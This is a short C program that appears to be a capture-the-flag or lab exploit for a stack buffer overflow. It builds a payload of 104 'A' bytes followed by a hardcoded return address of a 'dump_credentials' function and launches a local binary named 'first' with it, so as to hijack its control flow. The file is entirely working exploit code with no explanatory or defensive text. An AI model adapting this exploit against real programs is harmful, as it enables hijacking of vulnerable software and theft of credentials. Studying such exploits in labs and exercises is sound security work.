#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char payload[200];
    int offset = 104;  // Adjust this offset based on your GDB findings
    void (*dump_credentials_addr)() = (void (*)())0x080484b6;  // Adjust this address based on your GDB findings

    // Fill the buffer with 'A's
    memset(payload, 'A', offset);

    // Append the address of dump_credentials function
    memcpy(payload + offset, &dump_credentials_addr, sizeof(dump_credentials_addr));

    // Null-terminate the payload
    payload[offset + sizeof(dump_credentials_addr)] = '\0';

    // Execute the vulnerable program with the crafted payload
    execl("./first", "first", payload, NULL);

    return 0;
}
